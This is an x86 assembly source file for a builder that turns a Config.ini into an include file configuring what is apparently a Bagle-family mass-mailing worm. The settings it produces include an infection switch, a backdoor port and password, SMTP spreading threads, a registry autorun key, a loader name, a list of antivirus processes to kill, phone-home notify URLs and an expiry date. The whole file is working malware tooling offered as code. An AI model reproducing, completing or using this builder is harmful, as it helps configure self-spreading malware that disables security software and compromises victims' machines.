; #########################################################################

        .386
        .model flat, stdcall
        option casemap :none   ; case sensitive

; #########################################################################

	.nolist        
        include kernel32.inc
        include windows.inc
        include user32.inc
        include wsock32.inc
        include ole32.inc
        include shlwapi.inc
        include oaidl.inc
        include wininet.inc
        include advapi32.inc
        include shell32.inc

        .list
        includelib kernel32.lib
        includelib user32.lib
        includelib wsock32.lib
        includelib ole32.lib
        includelib shlwapi.lib
        includelib wininet.lib
        includelib advapi32.lib
        includelib shell32.lib

; #########################################################################

        szText MACRO Name, Text:VARARG
        LOCAL lbl
          jmp lbl
            Name db Text,0
          lbl:
        ENDM

        m2m MACRO M1, M2
          push M2
          pop  M1
        ENDM

        .data?
                szSections      db      8192 dup(?)
                szBuf           db      8192 dup(?)
                szStrBuf        db      8192 dup(?)
                szConfIniFile   db      2048 dup(?)
                hWriteFile      dd      ?

        .data
                dbCryptSeed             db      2, 3, 4, 5, 6, 7, 8


                szConfIniName           db      "\Config.ini",0
                szOut                   db      "Config.inc",0
                szErrorHdr              db      "Error: ",0

                szIniLoadError          db      "Could not load ini file",0

                szMainSecton            db      "MainSettings",0
                szFileSection           db      "FileNames",0

                szTime1Key              db      "WorkUntilYear",0
                szTime2Key              db      "WorkUntilMonth",0
                szTime3Key              db      "WorkUntilDay",0
                szConfTime1             db      "WorkUntilYear  equ     %lu",13,10,0
                szConfTime2             db      "WorkUntilMonth equ     %lu",13,10,0
                szConfTime3             db      "WorkUntilDay   equ     %lu",13,10,0

                szPRKey                 db      "Infect",0
                szPortKey               db      "Port",0
                szPassKey               db      "Password",0
                szConsKey               db      "MaxConnections",0
                szVersKey               db      "Version",0
                szDNSHostKey            db      "DNSHost",0
                szDNSPortKey            db      "DNSPort",0
                szMaxSmtpTrdKey         db      "MaxSmtpThreads",0
                szMaxSmtpAttKey         db      "MaxSmtpAttemps",0
                szRegBaseKey            db      "BaseRegPath",0
                szRegAutoKeyKey         db      "RegAutoKey",0
                szFileNameKey           db      "LoaderName",0
                szTestVerKey            db      "TestVersion",0
                szConfTestVer           db      "TESTVERSION EQU 1",13,10,0
               
                szAVSection             db      "AntiVirus",0
                szAVTimeoutKey          db      "ScanTimeout",0
                
                szNfySection            db      "Notify",0
                szNfyUrlKey             db      "Url",0
                szNfyTimeoutKey         db      "NotifyTimeout",0

                szNULL                  db      0
                szDefDNS                db      "217.5.97.137",0

                szConfHeader            db      ".data",13,10,13,10,0

                szConfPRUse             db      "DisableInfect equ TRUE",13,10,0
                szConfPort              db      "BasePort       dd    %lu",13,10,0
                szConfPass              db      'Password       dd    0%xh',13,10,0
                szConfCons              db      'MaxConnections equ   %lu',13,10,0
                szConfVers              db      "Ver            equ   %lu",13,10,0
                szConfDNS               db      'szDNSHost      db    "%s", 9 dup(0)',13,10,0
                szConfDNSPrt            db      'DNSPort        equ   %lu',13,10,0
                szConfSmtpTrd           db      "MaxSmtpThreads equ   %lu",13,10,0
                szConfSmtpAtt           db      "MaxSmtpAttemps equ   %lu",13,10,0
                szConfRegBase           db      'szRegBasePath  db    "SOFTWARE\%s",0',13,10,0
                szConfRegAutoKey        db      'szBglAutoKey   db    "%s",0',13,10,0
                szConfFileName          db      'szBglRealName  db    "\%s",0',13,10,0
                szConfFileName2         db      'szBglRealNameR equ db    "\%s",0',13,10,0

                szConfPK                db      "PKTimeout      equ   %s",13,10,0
                szConfPEntryFirst       db      13,10,'Processes      db    "%s",0',13,10,0
                szConfPEntryNext        db      '               db    "%s",0',13,10,0
                szConfPEntryLast        db      "               db    0",13,10,0
                szConfPKUse             db      "DisablePK      equ   TRUE",13,10,0
                szConfPEntryFlag        db      0

                szConfNfyTimeout        db      "NotifyTimeout  equ   %s",13,10,0
                szConfNfyUrl            db      'szNfyURLFmt    db    "%s",0',13,10,0
                szConfNfyEntryFirst     db      13,10,'Hosts          db    "%s",0',13,10,0
                szConfNfyUse            db      "DisableNotify  equ   TRUE",13,10,0
                szConfNfyFlag           db      0

        .code

        include Utils.asm

EncryptPass proc uses ebx lpPass: DWORD
        invoke  lstrlen, lpPass
        invoke  CRC32Update, eax, lpPass, eax
        mov     ebx, 50
@l:
        invoke  CRC32Update, eax, offset dbCryptSeed, 7
        xor     eax, ebx
        dec     ebx
        jns     @l
        ret
EncryptPass endp

Write proc uses ebx lpszText: DWORD
        LOCAL   dwWritten: DWORD
        invoke  GetStdHandle, STD_OUTPUT_HANDLE
        mov     ebx, eax
        invoke  lstrlen, lpszText
        mov     edx, eax
        invoke  WriteFile, ebx, lpszText, edx, addr dwWritten, NULL
        ret
Write endp

WriteLn proc lpszText: DWORD
        LOCAL   ln: DWORD
        invoke  Write, lpszText
        mov     ln, 0D0Ah
        invoke  Write, addr ln
        ret
WriteLn endp

WriteStr proc Value: DWORD
        LOCAL   dwWritten: DWORD

        invoke  lstrlen, Value
        xchg    eax, edx
        invoke  WriteFile, hWriteFile, Value, edx, addr dwWritten, NULL
        ret
WriteStr endp

WriteError proc lpszErrorText: DWORD
        invoke  Write, offset szErrorHdr
        invoke  WriteLn, lpszErrorText
        invoke  CloseHandle, hWriteFile
        invoke  ExitProcess, 0
        ret
WriteError endp

start:
        invoke  CRC32BuildTable

        ; Get Config.ini path
        invoke  GetCurrentDirectory, 2047, offset szConfIniFile
        invoke  lstrcat, offset szConfIniFile, offset szConfIniName

        invoke  CreateFile, offset szOut, GENERIC_WRITE, FILE_SHARE_WRITE or FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, 0
        mov     hWriteFile, eax

        invoke  GetPrivateProfileSectionNames, offset szSections, 8191, offset szConfIniFile
        .IF     !eax
                invoke  WriteError, offset szIniLoadError
        .ENDIF

        invoke  WriteStr, offset szConfHeader

        ; Infect?
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szPRKey, 0, offset szConfIniFile
        .IF     eax != 1
                invoke  WriteStr, offset szConfPRUse
        .ENDIF

        ; Port
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szPortKey, 6777, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfPort, eax
        invoke  WriteStr, offset szBuf

        ; Password
        invoke  GetPrivateProfileString, offset szMainSecton, offset szPassKey, offset szNULL, offset szStrBuf, 8191, offset szConfIniFile
        invoke  EncryptPass, offset szStrBuf
        invoke  wsprintf, offset szBuf, offset szConfPass, eax
        invoke  WriteStr, offset szBuf

        ; MaxConnections
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szConsKey, 0, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfCons, eax
        invoke  WriteStr, offset szBuf

        ; Version
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szVersKey, 0, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfVers, eax
        invoke  WriteStr, offset szBuf

        ; DNSHost
        invoke  GetPrivateProfileString, offset szMainSecton, offset szDNSHostKey, offset szDefDNS, offset szStrBuf, 8191, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfDNS, offset szStrBuf
        invoke  WriteStr, offset szBuf

        ; DNSPort
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szDNSPortKey, 53, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfDNSPrt, eax
        invoke  WriteStr, offset szBuf

        ; TestVersion
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szTestVerKey, 0, offset szConfIniFile
        .IF     eax == 1
                invoke  WriteStr, offset szConfTestVer
        .ENDIF

        ; Work Time
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szTime1Key, 0, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfTime1, eax
        invoke  WriteStr, offset szBuf
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szTime2Key, 0, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfTime2, eax
        invoke  WriteStr, offset szBuf
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szTime3Key, 0, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfTime3, eax
        invoke  WriteStr, offset szBuf

        ; DNSPort
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szDNSPortKey, 53, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfDNSPrt, eax
        invoke  WriteStr, offset szBuf

        ; MaxSmtpThreads
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szMaxSmtpTrdKey, 1, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfSmtpTrd, eax
        invoke  WriteStr, offset szBuf

        ; MaxSmtpAttemps
        invoke  GetPrivateProfileInt, offset szMainSecton, offset szMaxSmtpAttKey, 0, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfSmtpAtt, eax
        invoke  WriteStr, offset szBuf

        ; FileNames
        ; ---------

        ; BaseRegPath
        invoke  GetPrivateProfileString, offset szFileSection, offset szRegBaseKey, offset szNULL, offset szStrBuf, 8191, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfRegBase, offset szStrBuf
        invoke  WriteStr, offset szBuf

        ; RegAutoKey
        invoke  GetPrivateProfileString, offset szFileSection, offset szRegAutoKeyKey, offset szNULL, offset szStrBuf, 8191, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfRegAutoKey, offset szStrBuf
        invoke  WriteStr, offset szBuf

        ; LoaderName
        invoke  GetPrivateProfileString, offset szFileSection, offset szFileNameKey, offset szNULL, offset szStrBuf, 8191, offset szConfIniFile
        invoke  wsprintf, offset szBuf, offset szConfFileName, offset szStrBuf
        invoke  WriteStr, offset szBuf

        invoke  wsprintf, offset szBuf, offset szConfFileName2, offset szStrBuf
        invoke  WriteStr, offset szBuf

        ; AV Processes
        invoke  GetPrivateProfileSection, offset szAVSection, offset szStrBuf, 8191, offset szConfIniFile
        .IF     eax
                mov     esi, offset szStrBuf
        @av_loop:
                invoke  lstrlen, esi
                .IF     eax
                        mov     ebx, eax
                        invoke  StrStrI, esi, offset szAVTimeoutKey
                        .IF     !eax
                                .IF     !szConfPEntryFlag
                                        mov     szConfPEntryFlag, 1
                                        invoke  wsprintf, offset szBuf, offset szConfPEntryFirst, esi
                                .ELSE
                                        invoke  wsprintf, offset szBuf, offset szConfPEntryNext, esi
                                .ENDIF
                                invoke  WriteStr, offset szBuf
                        .ENDIF
                        add     esi, ebx
                        inc     esi
                        jmp     @av_loop
                .ENDIF
        .ENDIF
        .IF     szConfPEntryFlag
                invoke  WriteStr, offset szConfPEntryLast
                invoke  GetPrivateProfileString, offset szAVSection, offset szAVTimeoutKey, offset szNULL, offset szStrBuf, 8191, offset szConfIniFile
                invoke  wsprintf, offset szBuf, offset szConfPK, offset szStrBuf
                invoke  WriteStr, offset szBuf
        .ELSE
                invoke  WriteStr, offset szConfPKUse
        .ENDIF

        ; Notify
        invoke  GetPrivateProfileSection, offset szNfySection, offset szStrBuf, 8191, offset szConfIniFile
        .IF     eax
                mov     esi, offset szStrBuf
        @nfy_loop:
                invoke  lstrlen, esi
                .IF     eax
                        mov     ebx, eax
                        invoke  StrStrI, esi, offset szNfyTimeoutKey
                        mov     edi, eax
                        invoke  StrStrI, esi, offset szNfyUrlKey
                        or      edi, eax

                        .IF     !edi
                                .IF     !szConfNfyFlag
                                        mov     szConfNfyFlag, 1
                                        invoke  wsprintf, offset szBuf, offset szConfNfyEntryFirst, esi
                                .ELSE
                                        invoke  wsprintf, offset szBuf, offset szConfPEntryNext, esi
                                .ENDIF
                                invoke  WriteStr, offset szBuf
                        .ENDIF
                        add     esi, ebx
                        inc     esi
                        jmp     @nfy_loop
                .ENDIF
        .ENDIF
        .IF     szConfNfyFlag
                invoke  WriteStr, offset szConfPEntryLast
                invoke  GetPrivateProfileString, offset szNfySection, offset szNfyTimeoutKey, offset szNULL, offset szStrBuf, 8191, offset szConfIniFile
                invoke  wsprintf, offset szBuf, offset szConfNfyTimeout, offset szStrBuf
                invoke  WriteStr, offset szBuf

                invoke  GetPrivateProfileString, offset szNfySection, offset szNfyUrlKey, offset szNULL, offset szStrBuf, 8191, offset szConfIniFile
                invoke  wsprintf, offset szBuf, offset szConfNfyUrl, offset szStrBuf
                invoke  WriteStr, offset szBuf                
        .ELSE
                invoke  WriteStr, offset szConfNfyUse
        .ENDIF

        invoke  CloseHandle, hWriteFile
        retn
end start
